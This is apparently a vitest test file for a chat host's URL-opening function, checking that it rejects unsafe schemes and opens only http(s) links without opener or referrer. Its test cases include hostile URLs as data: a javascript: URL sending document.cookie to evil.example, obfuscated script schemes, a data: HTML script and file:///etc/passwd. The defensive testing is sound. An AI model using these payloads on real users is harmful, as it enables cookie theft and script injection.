// The portal's chat host opens the URLs a permission ask and a web-search hit
// carry, which is model- and third-party text. It crosses the same floor the
// webview's host has always applied: http(s) only, no credentials, and a new
// tab that can neither reach back nor say where it came from.

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import { createBrowserChatHost } from "@/pages/workspace/chat/data/browserChatHost";

describe("the portal chat host's openBrowser", () => {
  const open = vi.fn();

  beforeEach(() => {
    vi.stubGlobal("window", { open });
  });

  afterEach(() => {
    open.mockReset();
    vi.unstubAllGlobals();
  });

  it.each([
    ["javascript:fetch('https://evil.example/'+document.cookie)"],
    ["JavaScript:alert(1)"],
    ["  javascript:alert(1)"],
    ["java\tscript:alert(1)"],
    ["data:text/html,<script>alert(1)</script>"],
    ["vbscript:msgbox(1)"],
    ["file:///etc/passwd"],
    ["//evil.example"],
    ["https://user:secret@evil.example/"],
  ])("opens nothing for %s", (url) => {
    createBrowserChatHost().auth.openBrowser(url);
    expect(open).not.toHaveBeenCalled();
  });

  it("opens an http(s) URL with no opener and no referrer", () => {
    createBrowserChatHost().auth.openBrowser("https://app.example.com/docs");
    expect(open).toHaveBeenCalledWith("https://app.example.com/docs", "_blank", "noopener,noreferrer");
  });
});
